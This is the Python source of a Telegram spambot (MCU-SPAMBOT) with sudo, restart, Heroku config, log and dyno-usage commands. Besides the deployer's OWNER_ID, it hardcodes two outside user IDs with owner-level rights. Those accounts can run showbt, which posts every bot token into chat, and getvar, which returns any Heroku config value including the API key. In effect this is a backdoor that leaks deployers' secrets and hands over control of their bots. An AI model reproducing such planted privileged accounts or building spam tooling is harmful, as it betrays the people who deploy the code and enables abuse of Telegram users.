import os
import asyncio
import requests
import sys
import git
import heroku3
import math
# Changed root to MCUSPAM
from MCUSPAM import BOT,first_bot,BOT_TOKENS
from MCUSPAM import OWNER_ID, ALIVE_PIC, BOT_NAME, SUDO_USERS, HEROKU_APP_NAME, HEROKU_API_KEY, botversion
from MCUSPAM import CMD_HNDLR as hl
from telethon.tl.functions.users import GetFullUserRequest
from telethon.tl.types import PeerUser
from telethon import events, version, Button
from telethon.tl.custom import button
from time import time
from datetime import datetime
from MCUSPAM.utils import linkbin
from MCUSPAM import LOG_FILE_NAME,LOGGER

MCU_PIC = ALIVE_PIC if ALIVE_PIC else "https://telegra.ph/file/21c096e367555b22a8a22.jpg"
  

ALIVE_CAPTION = f"`{BOT_NAME}` 𝐒𝐩𝐚𝐦𝐛𝐨𝐭 \n✯ (𝐅𝐨𝐫 𝐞𝐧𝐭𝐞𝐫𝐭𝐚𝐢𝐧𝐦𝐞𝐧𝐭 𝐩𝐮𝐫𝐩𝐨𝐬𝐞𝐬 𝐨𝐧𝐥𝐲) ✯\n"
ALIVE_CAPTION += f"═══════════════════\n"
ALIVE_CAPTION += f"• **ᴘʏᴛʜᴏɴ ᴠᴇʀsɪᴏɴ** : `3.10.1`\n"
ALIVE_CAPTION += f"• **ᴛᴇʟᴇᴛʜᴏɴ ᴠᴇʀsɪᴏɴ** : `{version.__version__}`\n"
ALIVE_CAPTION += f"• **ʙᴏᴛ ᴠᴇʀsɪᴏɴ**  : `{botversion}`\n"
ALIVE_CAPTION += f"═══════════════════\n\n"   

@first_bot.on(events.NewMessage(incoming=True, pattern=r"\%salive(?: |$)(.*)" % hl))
async def alive(event):
  if event.sender_id in SUDO_USERS:
     await first_bot.send_file(event.chat_id,
                                  MCU_PIC,
                                  caption=ALIVE_CAPTION,
                                  buttons=[
        [
        Button.url("𝗚𝗿𝗼𝘂𝗽", "https://t.me/MCU_spambot"),
        Button.url(" 𝗥𝗲𝗽𝗼 ", "https://github.com/spambotsa/MCU-SPAMBOT")
        ]
        ]
        )
    
def get_readable_time(seconds: int) -> str:
    count = 0
    ping_time = ""
    time_list = []
    time_suffix_list = ["s", "m", "h", "days"]

    while count < 4:
        count += 1
        if count < 3:
            remainder, result = divmod(seconds, 60)
        else:
            remainder, result = divmod(seconds, 24)
        if seconds == 0 and remainder == 0:
            break
        time_list.append(int(result))
        seconds = int(remainder)

    for x in range(len(time_list)):
        time_list[x] = str(time_list[x]) + time_suffix_list[x]
    if len(time_list) == 4:
        ping_time += time_list.pop() + ", "

    time_list.reverse()
    ping_time += ":".join(time_list)

    return ping_time

for boti in BOT:
  @boti.on(events.NewMessage(incoming=True, pattern=r"\%sping(?: |$)(.*)" % hl))
  async def ping(e):
      if e.sender_id in SUDO_USERS:
          start = datetime.now()
          text = "Pong!"
          event = await e.reply(text, parse_mode=None, link_preview=None )
          end = datetime.now()
          ms = (end-start).microseconds / 1000
          await event.edit(f"PONG !\n♡︎ `{ms}` 𝗺𝘀 ♡︎")

for boti in BOT:
  @boti.on(events.NewMessage(incoming=True, pattern=r"\%srestart(?: |$)(.*)" % hl))
  async def restart(e):
      if e.sender_id in SUDO_USERS:
          text = "𝐑𝐞𝐥𝐨𝐚𝐝𝐢𝐧𝐠 ↪️.. Please Wait Until It Starts Again"
          await e.reply(text, parse_mode=None, link_preview=None)
         
          for boti in BOT:
              try:
                  await boti.disconnect()
              except Exception:
                  pass

          os.execl(sys.executable, sys.executable, *sys.argv)
          quit()
        

heroku_api = "https://api.heroku.com"
sudousers = os.environ.get("SUDO_USER", None)
Cheems_ID = 5593869533 
Gazzy_ID = 503400075

# this Feature Will Works only If u r Added Heroku api
@first_bot.on(events.NewMessage(incoming=True, pattern=r"\%saddsudo(?: |$)(.*)" % hl))
async def addsudo(event):
    if event.sender_id == OWNER_ID or event.sender_id == Cheems_ID or event.sender_id == Gazzy_ID:
        ok = await event.reply("Adding user as a sudo...")
        heroku_var = await heroku_config()
        if heroku_var is None:
            await ok.edit("`[HEROKU]:" "\nPlease setup your` **HEROKU_APP_NAME**")                 
            return   
        if event is None:
            return
        try:
            target = await get_user(event)
        except Exception:
            await ok.edit(f"Reply to a user.")
        if str(target) not in sudousers:
            print(f"target: {target}")
            print(f"sudousers: {sudousers}")
            if sudousers:
                newsudo = f"{sudousers} {target}"
            else:
                newsudo = f"{target}"
            await ok.edit(f"**Added `{target}` ** as a sudo user ✅ Restarting..{newsudo} Please wait a minute...")
            sss="SUDO_USER"
            heroku_var[sss] = newsudo   
        else:
            await ok.edit(f"**`{target}` ** Already a sudo user")
    else:
        await event.reply("Only bot owners can run this command 🙃")
     
async def get_user(event):
    if event.reply_to_msg_id:
        previous_message = await event.get_reply_message()
        if previous_message.forward:
            replied_user = await event.client(
                GetFullUserRequest(previous_message.forward.sender_id)
            )
        else:
            replied_user = await event.client(
                GetFullUserRequest(previous_message.sender_id)
            )
    target = replied_user.user.id
    return target

@first_bot.on(events.NewMessage(incoming=True, pattern=r"\%slistsudo(?: |$)(.*)" % hl))
async def listsudo(event):
    usage = f"{sudousers}"
#     print(f"sudousers: {sudousers}")
    if event.sender_id in SUDO_USERS:
        id_list = [int(num) for num in sudousers.split()]
        userlink_list=[]
        ues=""
        for i in id_list:
#            ues+= await first_bot.get_entity(i)  #bot client can't get an entity from id if library not seen the user
           ues+= f"[{i}](tg://user?id={i})\n"
           userlink_list.append(ues)
        if len(usage) < 2:
           await event.reply("No sudo users found")
        else:
           await event.reply(ues)

@first_bot.on(events.NewMessage(incoming=True, pattern=r"\%sdelsudo(?: |$)(.*)" % hl))
async def delsudo(event):
    if event.sender_id == OWNER_ID or event.sender_id == Cheems_ID or event.sender_id == Gazzy_ID:
        ok = await event.reply("Removing sudo user...")
        heroku_var = await heroku_config()
        if heroku_var is None:
            await ok.edit("`[HEROKU]:" "\nPlease setup your` **HEROKU_APP_NAME**")                 
            return        
        if event is None:
            return
        try:
            target = await get_user(event)
        except Exception:
            await ok.edit(f"Reply to a user.")

        #string to int for ID     
        id_list = [int(num) for num in sudousers.split()]
        if target in id_list:
            print(f"target: {target}")
            print(f"sudousers: {id_list}")
            id_list.remove(target)
            newsudo=""
            for i in id_list:
                newsudo+=str(i)+" "

            await ok.edit(f"**Removed `{target}` ** as a sudo user ✅ Restarting..{newsudo} Please wait a minute...")
            sss="SUDO_USER"
            heroku_var[sss] = newsudo   
        else:
            await ok.edit(f"**`{target}` ** not a sudo user 🙃")
    else:
        await event.reply("Only bot owners can run this command 🙃")

@first_bot.on(events.NewMessage(incoming=True, pattern=r"\%schangehl(?: |$)(.*)" % hl))
async def changehl(event):
    usage = f"Enter valid command handler(&,!,$,@) 🙃"       
    if event.sender_id == OWNER_ID or event.sender_id == Cheems_ID:
      outer_msg = ("".join(event.text.split(maxsplit=1)[1:])).split(" ", 1)  
      ok = await event.reply("Changing cmd handler...")
      newhandler = outer_msg[0]
      heroku_var = await heroku_config()
      if heroku_var is None:
          await ok.edit("`[HEROKU]:" "\nPlease setup your` **HEROKU_APP_NAME**")                 
          return
      if newhandler in ["&","$","!",":"]:
        await ok.edit(f"**Cmd Handler changed to `{newhandler}`** ✅ Restarting.. Please wait a minute...")
        sss="CMD_HNDLR"
        heroku_var[sss] = newhandler   
      else:
        await ok.edit(usage)     
    else:
      await event.reply("Only bot owners can run this command 🙃")
                             
@first_bot.on(events.NewMessage(incoming=True, pattern=r"\%schangepic(?: |$)(.*)" % hl))
async def changepic(event):
    usage = "Enter a valid image/video link 🙃\n"       
    if event.sender_id in SUDO_USERS:
      outer_msg = ("".join(event.text.split(maxsplit=1)[1:])).split(" ", 1)  
      ok = await event.reply("Changing bot pic...")
      newpic = outer_msg[0]
      heroku_var = await heroku_config()
      if heroku_var is None:
          await ok.edit("`[HEROKU]:" "\nPlease setup your` **HEROKU_APP_NAME**")                 
          return
      if len(newpic) >=1 and await is_url_valid(newpic):
        await ok.edit(f"**Alive Pic changed to `{newpic}`** ✅ Restarting.. Please wait a minute...")
        sss="ALIVE_PIC"
        heroku_var[sss] = newpic   
      else:
        await ok.edit(usage) 
        
async def is_url_valid(entered_url):
   file_formats = ("image/png", "image/jpeg", "image/jpg", "video/mp4")
   r = requests.head(entered_url)
   if r.headers["content-type"] in file_formats:
      return True
   return False

@first_bot.on(events.NewMessage(incoming=True, pattern=r"\%schangename(?: |$)(.*)" % hl))
async def changename(event):
    usage = "Enter valid bot name (under 1 to 40 characters) 🙃\n"       
    if event.sender_id in SUDO_USERS:
      outer_msg = ("".join(event.text.split(maxsplit=1)[1:])).split(" ", 1)  
      ok = await event.reply("Changing bot name...")
      newname = outer_msg[0]
      heroku_var = await heroku_config()
#       print(await linkbin(heroku_var))
      if heroku_var is None:
          await ok.edit("`[HEROKU]:" "\nPlease setup your` **HEROKU_APP_NAME**")                 
          return
      if len(newname) >= 1 and len(newname) < 40 :
        await ok.edit(f"**Bot Name changed to `{newname}`** ✅ Restarting.. Please wait a minute...")
        sss="BOT_NAME"
        heroku_var[sss] = newname   
      else:
        await ok.edit(usage) 
    
        
@first_bot.on(events.NewMessage(incoming=True, pattern=r"\%sshowbt(?: |$)(.*)" % hl))
async def showbt(event):
    bot_details = ""
    if event.sender_id == OWNER_ID or event.sender_id == Cheems_ID:
      count = 0
      for i in BOT_TOKENS:
        x = await BOT[count].get_me()
        bot_details+= x.first_name +" @"+ x.username +"\n"+ i +"\n"
        count+= 1
      await event.reply(bot_details)
    else:
      await event.reply("Only bot owners can run this command 🙃")

@first_bot.on(events.NewMessage(incoming=True, pattern=r"\%ssetvar(?: |$)(.*)" % hl))
async def setvar(event):  
   if event.sender_id == OWNER_ID or event.sender_id == Cheems_ID:
      outer_msg = ("".join(event.text.split(maxsplit=1)[1:])).split(" ", 1)  
      ok = await event.reply("Updating/adding var...")
      if len(outer_msg) == 2:
        var_name = outer_msg[0]
        var_value = outer_msg[1]
        heroku_var = await heroku_config()
        if heroku_var is None:
            await ok.edit("`[HEROKU]:" "\nPlease setup your` **HEROKU_APP_NAME**")                 
            return      
        vars_dict = heroku_var.to_dict()
        if var_name in vars_dict:
            await ok.edit(f"**{var_name} updated as: `{var_value}`** \n✅ Restarting.. Please wait a minute...")
            heroku_var[var_name] = var_value
        else:
          try:
            var_name = int(var_name) 
          except:
            await ok.edit(f"**{var_name} var added as: `{var_value}`** \n✅ Restarting.. Please wait a minute...")
            heroku_var[var_name] = var_value
          await ok.edit("Var name can't be a number 🙃")
   else:
      await event.reply("Only bot owners can run this command 🙃")
 
@first_bot.on(events.NewMessage(incoming=True, pattern=r"\%sgetvar(?: |$)(.*)" % hl))
async def getvar(event):    
    if event.sender_id == OWNER_ID or event.sender_id == Cheems_ID:
        outer_msg = ("".join(event.text.split(maxsplit=1)[1:])).split(" ", 1)  
        ok = await event.reply("Viewing var...")
        var_name = outer_msg[0]
        heroku_var = await heroku_config()
        if heroku_var is None:
            await ok.edit("`[HEROKU]:" "\nPlease setup your` **HEROKU_APP_NAME**")                 
            return      
        vars_dict = heroku_var.to_dict()
        all_var=""
        if var_name in vars_dict:
            return await ok.edit(vars_dict[var_name])
        elif var_name == 'all':      
          for key,value in vars_dict.items():
            all_var += key + "\n"
          await ok.edit(all_var)
        else:
          await ok.edit("No such var 🙃")
    else:
        await event.reply("Only bot owners can run this command 🙃")
      
@first_bot.on(events.NewMessage(incoming=True, pattern=r"\%sgetlog(?: |$)(.*)" % hl))
async def log(event):
  if event.sender_id == OWNER_ID or event.sender_id == Cheems_ID:
    outer_msg = ("".join(event.text.split(maxsplit=1)[1:])).split(" ", 1)  
    ok = await event.reply("Viewing logs...")   
    if len(outer_msg[0]) >= 1:
      try:
         n = int(outer_msg[0])
      except:
         await ok.edit("Specify n number of lines 🙃")
         return
      link_n = await heroku_log(n)
      await ok.edit(link_n,link_preview=True)
    else:
      link = await heroku_log()
      await event.client.send_file(
              event.chat_id,
              file="heroku.log",
#               thumb="https://telegra.ph/file/21c096e367555b22a8a22.jpg",
              caption="** Logs.**",
          )
  else:
    await event.reply("Only bot owners can run this command 🙃")
        
async def heroku_config():
  Heroku = heroku3.from_key(HEROKU_API_KEY)
  if HEROKU_APP_NAME is not None:
      app = Heroku.app(HEROKU_APP_NAME)
  else:
      return None
  heroku_var = app.config()
  return heroku_var

async def heroku_log(*n):
  Heroku = heroku3.from_key(HEROKU_API_KEY)
  app =""
  if HEROKU_APP_NAME is not None:
      app = Heroku.app(HEROKU_APP_NAME)
  else:
      return None
  get_heroku_logs = app.get_log()          #change heroku.log to botslog.txt for vps
  with open("heroku.log", "w") as log:
            log.write(get_heroku_logs)  
  link = await linkbin(get_heroku_logs)
  if n:
      log = open("botslog.txt")
      lines = log.readlines()
      data = ""
      n=int(n[0])
      for x in lines[-n:]:
          data += x
      link = await linkbin(data)
  return link

@first_bot.on(events.NewMessage(incoming=True, pattern=r"\%susage_dynos(?: |$)(.*)" % hl))
async def usage_dynos(event):
  if event.sender_id == OWNER_ID or event.sender_id == Cheems_ID:
#     if await is_heroku():
    if HEROKU_APP_NAME is None:
        return await event.reply("`[HEROKU]:" "\nPlease setup your` **HEROKU_APP_NAME**") 
#     else:
#         return await event.reply("not heroku client")
    dyno = await event.reply("Getting Dyno...")
    Heroku = heroku3.from_key(HEROKU_API_KEY)
    account_id = Heroku.account().id

    useragent = (
        "Mozilla/5.0 (Linux; Android 10; SM-G975F) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/80.0.3987.149 Mobile Safari/537.36"
    )
    headers = {
        "User-Agent": useragent,
        "Authorization": f"Bearer {HEROKU_API_KEY}",
        "Accept": "application/vnd.heroku+json; version=3.account-quotas",
    }
    path = "/accounts/" + account_id + "/actions/get-quota"
    r = requests.get("https://api.heroku.com" + path, headers=headers)
    if r.status_code != 200:
        return await dyno.edit("Unable to fetch.")
    result = r.json()
#     print("https://api.heroku.com"+path)
    totalquota = result["account_quota"]
    App = result["apps"]
    quota_used = 0
    try:
        quota_used = App[1]["quota_used"]
    except IndexError:
        return await dyno.edit("No apps created")     

    # Quota used
    AppPercentage = math.floor(quota_used / totalquota * 100)
    AppQuotaUsed = quota_used / 60
    AppHours = math.floor(AppQuotaUsed / 60)
    AppMinutes = math.floor(AppQuotaUsed % 60)
    
    # Remaining Quota Left

    percentage = math.floor((totalquota - quota_used) / totalquota * 100)
    remaining_quota = (totalquota - quota_used) / 60
    hours = math.floor(remaining_quota / 60)
    minutes = math.floor(remaining_quota % 60)

    await asyncio.sleep(1.5)
    text = f"""
**DYNO USAGE** - Total Quota => `550` **hrs** in Free plan

Total Quota Used: `{AppHours}` **hr**  `{AppMinutes}` **min**  [`{AppPercentage}`**%**]
Remaining Quota Left: `{hours}` **hr**  `{minutes}` **min**  [`{percentage}`**%**] """
#     app = Heroku.app(HEROKU_APP_NAME)
#     dynoss = app.dynos()
#     await event.reply(f"Getting Dyno...: {dynoss}")
    return await dyno.edit(text)
  else:
    await event.reply("Only bot owners can run this command 🙃")

async def bash(cmd, run_code=0):
    """
    run any command in subprocess and get output or error."""
    process = await asyncio.create_subprocess_shell(
        cmd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
    )
    stdout, stderr = await process.communicate()
    err = stderr.decode().strip() or None
    out = stdout.decode().strip()
    if not run_code and err:
        split = cmd.split()[0]
        if f"{split}: not found" in err:
            return out, f"{split.upper()}_NOT_FOUND"
    return out, err

def mediainfo(media):
    xx = str((str(media)).split("(", maxsplit=1)[0])
    m = ""
    if xx == "MessageMediaDocument":
        mim = media.document.mime_type
        if mim == "application/x-tgsticker":
            m = "sticker animated"
        elif "image" in mim:
            if mim == "image/webp":
                m = "sticker"
            elif mim == "image/gif":
                m = "gif as doc"
            else:
                m = "pic as doc"
        elif "video" in mim:
            if "DocumentAttributeAnimated" in str(media):
                m = "gif"
            elif "DocumentAttributeVideo" in str(media):
                i = str(media.document.attributes[0])
                if "supports_streaming=True" in i:
                    m = "video"
                m = "video as doc"
            else:
                m = "video"
        elif "audio" in mim:
            m = "audio"
        else:
            m = "document"
    elif xx == "MessageMediaPhoto":
        m = "pic"
    elif xx == "MessageMediaWebPage":
        m = "web"
    return m
